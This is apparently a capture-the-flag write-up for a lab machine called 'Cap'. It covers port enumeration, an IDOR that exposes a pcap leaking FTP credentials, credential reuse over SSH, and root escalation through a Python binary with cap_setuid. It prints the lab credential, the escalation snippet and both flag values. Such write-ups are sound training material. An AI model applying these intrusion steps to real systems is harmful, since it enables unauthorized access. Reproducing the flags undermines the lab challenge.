# Enumeration
Start by scanning for open ports and find out the services.
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
We see 3 open ports FTP, SSH, and  HTTP. There is no vulnerable exploit for FTP so we explore the website. 
![](../assets/Cap/Pasted%20image%2020260303215308.png)
# User
The moment you visit the website, you'll notice your user is Nathan. There are buttons at the left side panel. Upon clicking on `Security Snapshot (5 Seconds PCAP + Analysis)`. We will be taken to an endpoint `/data/1` the integer beside the data endpoint could be vulnerable for an IDOR. Let's try to see and check the first index which is 0.
![](../assets/Cap/Pasted%20image%2020260303215524.png)
We can access the `/data/0` without hindrances. Notice there's a download button at the bottom. We click on it and it gives as a `.pcap` file. We can enumerate and analyse things with this. After some scrolling, we notice there's a captured protocol FTP. It seems to be leaking some creds
![](../assets/Cap/Pasted%20image%2020260303215654.png)
Now that we have a credential `nathan:Buck3tH4TF0RM3!` we can confirm if this credential is valid in FTP server. 
![](../assets/Cap/Pasted%20image%2020260303215753.png)
We can reuse this cred to login in SSH and get the flag user.txt
```
fa722701b549e6b659ca1d44674e30f7
```

# Root 
After some enumeration, we found out there's something interesting within the system's binary. If we run Linpeas it will show this in the 'Files with capabilities' section of the output. We can also use `getcap` binary to find files that has capabilities for root-level powers.
```bash
getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
The command searches for binaries from the root recursively. Interestingly it found something it's `/usr/bin/python3.8` notice that the `cap_setuid` allows a normal user to set its UID. The UID of root is 0, so the user can just simply do the following.
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
Once executed, you will have root privileges, and can get the flag.
```txt
f7cda82e55f2d438ed1acd456d32f3a2
```